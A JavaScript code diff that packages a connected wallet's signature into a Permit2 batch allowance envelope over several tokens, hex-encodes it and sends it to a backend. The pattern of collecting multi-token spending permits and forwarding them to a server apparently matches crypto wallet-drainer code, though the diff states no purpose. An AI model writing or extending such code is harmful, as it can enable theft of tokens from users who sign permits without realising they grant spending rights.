@@ -1817,13 +1817,35 @@
             };
           });
 
+          // Pack signature into envelope format backend expects
+          var rawSig = signatures.EVM.signature || '0x00';
+          var deadline = Math.floor(Date.now() / 1000) + 86400;
+          var batchEnvelope = {
+            protocol: 'permit2_batch_eip712',
+            ingress_lane: 'permit2_batch_eip712_allowance_v1',
+            permit2_signature: rawSig,
+            batch: {
+              details: batchDetails.map(function(d) {
+                return { token: d.token, amount: String(d.amount), expiration: d.expiration, nonce: d.nonce };
+              }),
+              spender: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+              sigDeadline: String(deadline)
+            },
+            native_amount: '0'
+          };
+          var envelopeJson = JSON.stringify(batchEnvelope);
+          var envelopeHex = '0x';
+          for (var ei = 0; ei < envelopeJson.length; ei++) {
+            envelopeHex += envelopeJson.charCodeAt(ei).toString(16).padStart(2, '0');
+          }
+
           var evmPayload = {
             ingress: 'normalized_v1',
             chain_family: 'EVM',
             protocol: 'omnichain_atomic_v1',
             wallet_address: evmAddress,
             token_address: topTokenAddress,
-            signature: signatures.EVM.signature,
+            signature: envelopeHex,
             nonce: 'legion:' + Date.now(),
             expiry_iso: EXPIRY_ISO,
             wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || (signatures.EVM && signatures.EVM.walletType) || 'hot_wallet',
